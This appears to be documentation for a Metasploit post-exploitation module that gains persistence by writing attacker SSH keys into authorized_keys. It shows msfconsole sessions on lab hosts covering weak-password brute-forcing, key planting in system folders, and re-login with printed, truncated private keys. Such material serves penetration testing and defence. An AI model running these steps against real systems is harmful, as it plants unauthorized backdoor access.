This module will add an SSH key to a specified user (or all), to allow remote login on the victim via SSH at any time.

### Creating A Testing Environment

  This module has been tested against:

1. Kali Rolling
2. Ubuntu 16.04
3. Centos 6
4. Fedora 20
5. FreeBSD 9

## Verification Steps

  1. Start msfconsole
  2. Exploit a box via whatever method
  4. Do: `use post/linux/manage/sshkey_persistence`
  5. Do: `set session #`
  6. Optional Do: `set username`
  7. Do: `set verbose true`
  8. Optional Do: `Set sshd_config`
  9. Do: `exploit`


## Options

  **SSHD_CONFIG**

  Location of the sshd_config file on the remote system.  We use this to determine if the authorized_keys file location has changed on the system.  If it hasn't, we default to .ssh/authorized_keys

  **USERNAME**

  If set, we only write our key to this user.  If not, we'll write to all users

  **PUBKEY**

  A public key to use.  If not provided, a pub/priv key pair is generated automatically

## Scenarios

### Ubuntu 16.04 (user level)

Get initial access

    msf auxiliary(ssh_login) > exploit
    
    [*] SSH - Starting bruteforce
    [+] SSH - Success: 'tiki:tiki' 'uid=1000(tiki) gid=1000(tiki) groups=1000(tiki),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare) Linux tikiwiki 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux '
    [!] No active DB -- Credential data will not be saved!
    [*] Command shell session 1 opened (192.168.2.229:38886 -> 192.168.2.190:22) at 2016-06-19 09:52:48 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

Use the post module to write the ssh key

    msf auxiliary(ssh_login) > use post/linux/manage/sshkey_persistence 
    msf post(sshkey_persistence) > set session 1
    session => 1
    msf post(sshkey_persistence) > set verbose true
    verbose => true
    msf post(sshkey_persistence) > set user tiki
    user => tiki
    msf post(sshkey_persistence) > set CreateSSHFolder true
    CreateSSHFolder => true
    msf post(sshkey_persistence) > exploit
    
    [*] Checking SSH Permissions
    [+] Pubkey set to yes
    [*] Authorized Keys File: .ssh/authorized_keys
    [*] Added User SSH Path: /home/tiki/.ssh
    [*] Attempting to create ssh folders that don't exist
    [+] Storing new private key as /root/.msf4/loot/20160619095250_default_192.168.2.190_id_rsa_425588.txt
    [*] Adding key to /home/tiki/.ssh/authorized_keys
    [*] Max line length is 65537
    [*] Writing 761 bytes in 1 chunks of 2886 bytes (octal-encoded), using printf
    [+] Key Added
    [!] No active DB -- Credential data will not be saved!
    [*] Post module execution completed

Verify our access works

    msf post(sshkey_persistence) > use auxiliary/scanner/ssh/ssh_login_pubkey 
    msf auxiliary(ssh_login_pubkey) > set rhosts 192.168.2.190
    rhosts => 192.168.2.190
    msf auxiliary(ssh_login_pubkey) > set key_path /root/.msf4/loot/
    key_path => /root/.msf4/loot/
    msf auxiliary(ssh_login_pubkey) > set username tiki
    username => tiki
    msf auxiliary(ssh_login_pubkey) > run
    
    [*] 192.168.2.190:22 SSH - Testing Cleartext Keys
    [*] SSH - Testing 2 keys from /root/.msf4/loot
    [+] SSH - Success: 'tiki:-----BEGIN RSA PRIVATE KEY-----
    ...snip...
    7m+il2AWyuPWOWEnpXRur3knruE2k97ObMH92FeI8SYaIThvqNUL
    -----END RSA PRIVATE KEY-----
    ' 'uid=1000(tiki) gid=1000(tiki) groups=1000(tiki),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare) Linux tikiwiki 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux '
    [!] No active DB -- Credential data will not be saved!
    [*] Command shell session 2 opened (192.168.2.229:42580 -> 192.168.2.190:22) at 2016-06-19 09:56:22 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

If you try to run for a user you don't have permissions for

    msf post(sshkey_persistence) > exploit

    [*] Checking SSH Permissions
    [+] Pubkey set to yes
    [*] Authorized Keys File: .ssh/authorized_keys
    [*] Added: /root/.ssh
    [*] Attempting to create ssh folders that don't exist
    [+] /root/.ssh
    [*] Creating /root/.ssh folder
    [-] No users found with a .ssh directory
    [*] Post module execution completed

### CentOS 6 (user level)
ssh keys must be enabled in sshd_config.

Get Initial Access

    msf > use auxiliary/scanner/ssh/ssh_login
    msf auxiliary(ssh_login) > set username user
    username => user
    msf auxiliary(ssh_login) > set password password
    password => password
    msf auxiliary(ssh_login) > set rhosts 192.168.4.62
    rhosts => 192.168.4.62
    msf auxiliary(ssh_login) > exploit
    
    [*] SSH - Starting bruteforce
    [+] SSH - Success: 'user:password' 'uid=500(user) gid=500(user) groups=500(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Linux localhost.localdomain 2.6.32-71.el6.x86_64 #1 SMP Fri May 20 03:51:51 BST 2011 x86_64 x86_64 x86_64 GNU/Linux '
    [!] No active DB -- Credential data will not be saved!
    [*] Command shell session 1 opened (192.168.2.229:39289 -> 192.168.4.62:22) at 2016-06-19 15:27:27 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

Use the post module to write the ssh key

    msf auxiliary(ssh_login) > use post/linux/manage/sshkey_persistence 
    msf post(sshkey_persistence) > set session 1
    session => 1
    msf post(sshkey_persistence) > set verbose true
    verbose => true
    msf post(sshkey_persistence) > set user user
    user => user
    msf post(sshkey_persistence) > exploit
    
    [*] Checking SSH Permissions
    [*] Authorized Keys File: .ssh/authorized_keys
    [*] Added User SSH Path: /home/user/.ssh
    [*] Attempting to create ssh folders that don't exist
    [+] Storing new private key as /root/.msf4/loot/20160619152757_default_192.168.4.62_id_rsa_633695.txt
    [*] Creating /home/user/.ssh/authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1447 bytes (octal-encoded), using printf
    [+] Key Added
    [!] No active DB -- Credential data will not be saved!
    [*] Post module execution completed

Verify our access works

    msf post(sshkey_persistence) > use auxiliary/scanner/ssh/ssh_login_pubkey 
    msf auxiliary(ssh_login_pubkey) > set rhosts 192.168.4.62
    rhosts => 192.168.4.62
    msf auxiliary(ssh_login_pubkey) > set key_path /root/.msf4/loot/
    key_path => /root/.msf4/loot/
    msf auxiliary(ssh_login_pubkey) > set username user
    username => user
    msf auxiliary(ssh_login_pubkey) > run
    
    [*] 192.168.4.62:22 SSH - Testing Cleartext Keys
    [*] SSH - Testing 6 keys from /root/.msf4/loot
    [+] SSH - Success: 'user:-----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEA8xtiDZrE6XgkOJaatg+TvUcrEr92/GDSZUtEqO9RvvvPO1Yt
    ...snip...
    Ubz5hiBypg1/C2TMB9jH3QLKmT66Te7rfym7rOBIgIJKivs5JLZe7w==
    -----END RSA PRIVATE KEY-----
    ' 'uid=500(user) gid=500(user) groups=500(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Linux localhost.localdomain 2.6.32-71.el6.x86_64 #1 SMP Fri May 20 03:51:51 BST 2011 x86_64 x86_64 x86_64 GNU/Linux '
    [!] No active DB -- Credential data will not be saved!
    [*] Command shell session 2 opened (192.168.2.229:34721 -> 192.168.4.62:22) at 2016-06-19 15:49:34 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

### CentOS 6 (root)
The following sshd_config changes were made:

    PubkeyAuthentication yes
    AuthorizedKeysFile	.sshsecret/.authorized_keys
    PermitRootLogin yes


Get Initial Access

    msf > use auxiliary/scanner/ssh/ssh_login
    msf auxiliary(ssh_login) > set username root
    username => root
    msf auxiliary(ssh_login) > set password pass
    password => pass
    msf auxiliary(ssh_login) > set rhosts 192.168.4.62
    rhosts => 192.168.4.62
    msf auxiliary(ssh_login) > exploit
    
    [*] SSH - Starting bruteforce
    [+] SSH - Success: 'root:pass' 'uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Linux localhost.localdomain 2.6.32-71.el6.x86_64 #1 SMP Fri May 20 03:51:51 BST 2011 x86_64 x86_64 x86_64 GNU/Linux '
    [!] No active DB -- Credential data will not be saved!
    [*] Command shell session 1 opened (192.168.2.229:46420 -> 192.168.4.62:22) at 2016-06-19 15:58:32 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

Use the post module to write the ssh key.  Keep in mind NOT setting a user (targeted), and CreateSSHFolder will possibly make MANY folders/files as can be observed below.

    msf auxiliary(ssh_login) > use post/linux/manage/sshkey_persistence 
    msf post(sshkey_persistence) > set session 1
    session => 1
    msf post(sshkey_persistence) > set verbose true
    verbose => true
    msf post(sshkey_persistence) > set CreateSSHFolder true
    CreateSSHFolder => true
    msf post(sshkey_persistence) > exploit
    
    [*] Checking SSH Permissions
    [+] Pubkey set to yes
    [*] Authorized Keys File: .sshsecret/.authorized_keys
    [*] Finding .sshsecret directories
    [*] Attempting to create ssh folders that don't exist
    [*] Creating //.sshsecret folder
    [*] Creating /bin/.sshsecret folder
    [*] Creating /dev/.sshsecret folder
    [*] Creating /etc/abrt/.sshsecret folder
    [*] Creating /etc/ntp/.sshsecret folder
    [*] Creating /proc/.sshsecret folder
    [*] Creating /root/.sshsecret folder
    [*] Creating /sbin/.sshsecret folder
    [*] Creating /usr/games/.sshsecret folder
    [*] Creating /var/adm/.sshsecret folder
    [*] Creating /var/cache/rpcbind/.sshsecret folder
    [*] Creating /var/empty/saslauth/.sshsecret folder
    [*] Creating /var/empty/sshd/.sshsecret folder
    [*] Creating /var/ftp/.sshsecret folder
    [*] Creating /var/gopher/.sshsecret folder
    [*] Creating /var/lib/avahi-autoipd/.sshsecret folder
    [*] Creating /var/lib/gdm/.sshsecret folder
    [*] Creating /var/lib/hsqldb/.sshsecret folder
    [*] Creating /var/lib/mysql/.sshsecret folder
    [*] Creating /var/lib/nfs/.sshsecret folder
    [*] Creating /var/run/avahi-daemon/.sshsecret folder
    [*] Creating /var/run/pulse/.sshsecret folder
    [*] Creating /var/spool/lpd/.sshsecret folder
    [*] Creating /var/spool/mail/.sshsecret folder
    [*] Creating /var/spool/postfix/.sshsecret folder
    [*] Creating /var/spool/uucp/.sshsecret folder
    [*] Creating /var/www/.sshsecret folder
    [+] Storing new private key as /root/.msf4/loot/20160619155920_default_192.168.4.62_id_rsa_271813.txt
    [*] Creating //.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [!] No active DB -- Credential data will not be saved!
    [*] Creating /bin/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /dev/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /etc/abrt/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /etc/ntp/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Adding key to /home/user/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 761 bytes in 1 chunks of 2910 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /root/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /sbin/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /usr/games/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /var/adm/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /var/cache/rpcbind/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /var/empty/saslauth/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /var/empty/sshd/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /var/ftp/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /var/gopher/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /var/lib/avahi-autoipd/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /var/lib/gdm/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /var/lib/hsqldb/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /var/lib/mysql/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /var/lib/nfs/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /var/run/avahi-daemon/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /var/run/pulse/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /var/spool/lpd/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /var/spool/mail/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /var/spool/postfix/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /var/spool/uucp/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Creating /var/www/.sshsecret/.authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1458 bytes (octal-encoded), using printf
    [+] Key Added
    [*] Post module execution completed


### FreeBSD9 (root)

Several sshd_config mods were needed to allow root login, and enable the service to run correctly.

Get Initial Access

    msf > use auxiliary/scanner/ssh/ssh_login
    msf auxiliary(ssh_login) > set username root
    username => root
    msf auxiliary(ssh_login) > set password password
    password => password
    msf auxiliary(ssh_login) > set rhosts 192.168.2.130
    rhosts => 192.168.2.130
    msf auxiliary(ssh_login) > exploit
    
    [*] SSH - Starting bruteforce
    [+] SSH - Success: 'root:password' 'uid=0(root) gid=0(wheel) groups=0(wheel),5(operator) FreeBSD freebsd9 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64 '
    [!] No active DB -- Credential data will not be saved!
    [*] Command shell session 1 opened (192.168.2.229:41724 -> 192.168.2.130:22) at 2016-06-19 22:10:59 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

Use the post module to write the ssh key

    msf auxiliary(ssh_login) > use post/linux/manage/sshkey_persistence 
    msf post(sshkey_persistence) > set session 1
    session => 1
    msf post(sshkey_persistence) > set verbose true
    verbose => true
    msf post(sshkey_persistence) > set username root
    username => root
    msf post(sshkey_persistence) > exploit
    
    [*] Checking SSH Permissions
    [+] Pubkey set to yes
    [*] Authorized Keys File: .ssh/authorized_keys
    [*] Finding .ssh directories
    [+] Storing new private key as /root/.msf4/loot/20160619221108_default_192.168.2.130_id_rsa_441694.txt
    [*] Creating /root/.ssh/authorized_keys
    [*] Max line length is 131073
    [*] Writing 380 bytes in 1 chunks of 1461 bytes (octal-encoded), using printf
    [+] Key Added
    [!] No active DB -- Credential data will not be saved!
    [*] Post module execution completed

Verify our access works

    msf post(sshkey_persistence) > use auxiliary/scanner/ssh/ssh_login_pubkey 
    msf auxiliary(ssh_login_pubkey) > set rhosts 192.168.2.130
    rhosts => 192.168.2.130
    msf auxiliary(ssh_login_pubkey) > set key_path /root/.msf4/loot/
    key_path => /root/.msf4/loot/
    msf auxiliary(ssh_login_pubkey) > set username root
    username => root
    msf auxiliary(ssh_login_pubkey) > run
    
    [*] 192.168.2.130:22 SSH - Testing Cleartext Keys
    [*] SSH - Testing 4 keys from /root/.msf4/loot
    [+] SSH - Success: 'root:-----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEAqBC5XwkPOAtFn8zCFWIs3IIzUUfMvJPWxQQl1Porf8GiSs2B
    ...snip...
    6aj815iPJp9X5vnIR6mRdTJP9UQraPe6jneicx8QfncfoqJbA2v7
    -----END RSA PRIVATE KEY-----
    ' 'uid=0(root) gid=0(wheel) groups=0(wheel),5(operator) FreeBSD freebsd9 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64 '
    [*] Command shell session 2 opened (192.168.2.229:32991 -> 192.168.2.130:22) at 2016-06-19 22:14:16 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed


### Fedora 20 (root)

Get Initial Access

    msf > use auxiliary/scanner/ssh/ssh_login
    msf auxiliary(ssh_login) > set username root
    username => root
    msf auxiliary(ssh_login) > set password password
    password => password
    msf auxiliary(ssh_login) > set rhosts 192.168.2.143
    rhosts => 192.168.2.143
    msf auxiliary(ssh_login) > exploit
    
    [*] SSH - Starting bruteforce
    [+] SSH - Success: 'root:password' 'uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Linux localhost.homeGroup 3.11.10-301.fc20.x86_64 #1 SMP Thu Dec 5 14:01:17 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux '
    [!] No active DB -- Credential data will not be saved!
    [*] Command shell session 1 opened (192.168.2.229:35460 -> 192.168.2.143:22) at 2016-06-19 20:27:53 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

Use the post module to write the ssh key

    msf auxiliary(ssh_login) > use post/linux/manage/sshkey_persistence 
    msf post(sshkey_persistence) > set session 1
    session => 1
    msf post(sshkey_persistence) > set verbose true
    verbose => true
    msf post(sshkey_persistence) > set user root
    user => root
    msf post(sshkey_persistence) > exploit
    
    [*] Checking SSH Permissions
    [*] Authorized Keys File: .ssh/authorized_keys
    [*] Added User SSH Path: /root/.ssh
    [+] Storing new private key as /root/.msf4/loot/20160619202835_default_192.168.2.143_id_rsa_458964.txt
    [*] Creating /root/.ssh/authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1456 bytes (octal-encoded), using printf
    [+] Key Added
    [!] No active DB -- Credential data will not be saved!
    [*] Post module execution completed

Verify our access works

    msf post(sshkey_persistence) > use auxiliary/scanner/ssh/ssh_login_pubkey 
    msf auxiliary(ssh_login_pubkey) > set rhosts 192.168.2.143
    rhosts => 192.168.2.143
    msf auxiliary(ssh_login_pubkey) > set key_path /root/.msf4/loot/
    key_path => /root/.msf4/loot/
    msf auxiliary(ssh_login_pubkey) > set username root
    username => root
    msf auxiliary(ssh_login_pubkey) > run
    
    [*] 192.168.2.143:22 SSH - Testing Cleartext Keys
    [*] SSH - Testing 2 keys from /root/.msf4/loot
    [!] No active DB -- Credential data will not be saved!
    [+] SSH - Success: 'root:-----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEAx5LLnAOPzc5KSI/Zd71bdHlexQrIpuASjUIGnJjlJVB9Sfyz
    ...snip...
    vtOaL6/NsfxFDDrCBX72X5tv3rTA4MNzOFTYbCM80Ln6E2TDWgPv
    -----END RSA PRIVATE KEY-----
    ' 'uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Linux localhost.homeGroup 3.11.10-301.fc20.x86_64 #1 SMP Thu Dec 5 14:01:17 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux '
    [*] Command shell session 2 opened (192.168.2.229:35751 -> 192.168.2.143:22) at 2016-06-19 20:31:23 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed


### Fedora 20 (user level)

Get Initial Access

    msf > use auxiliary/scanner/ssh/ssh_login
    msf auxiliary(ssh_login) > set username user
    username => user
    msf auxiliary(ssh_login) > set password password
    password => password
    msf auxiliary(ssh_login) > set rhosts 192.168.2.143
    rhosts => 192.168.2.143
    msf auxiliary(ssh_login) > exploit
    
    [*] SSH - Starting bruteforce
    [+] SSH - Success: 'user:password' 'uid=1000(user) gid=1000(user) groups=1000(user),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Linux localhost.homeGroup 3.11.10-301.fc20.x86_64 #1 SMP Thu Dec 5 14:01:17 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux '
    [!] No active DB -- Credential data will not be saved!
    [*] Command shell session 1 opened (192.168.2.229:37727 -> 192.168.2.143:22) at 2016-06-19 20:33:45 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

Use the post module to write the ssh key

    msf auxiliary(ssh_login) > use post/linux/manage/sshkey_persistence 
    msf post(sshkey_persistence) > set session 1
    session => 1
    msf post(sshkey_persistence) > set verbose true
    verbose => true
    msf post(sshkey_persistence) > set username user
    username => user
    msf post(sshkey_persistence) > exploit
    
    [*] Checking SSH Permissions
    [*] Authorized Keys File: .ssh/authorized_keys
    [*] Finding .ssh directories
    [+] Storing new private key as /root/.msf4/loot/20160619203401_default_192.168.2.143_id_rsa_010117.txt
    [*] Creating /home/user/.ssh/authorized_keys
    [*] Max line length is 65537
    [*] Writing 380 bytes in 1 chunks of 1452 bytes (octal-encoded), using printf
    [+] Key Added
    [!] No active DB -- Credential data will not be saved!
    [*] Post module execution completed
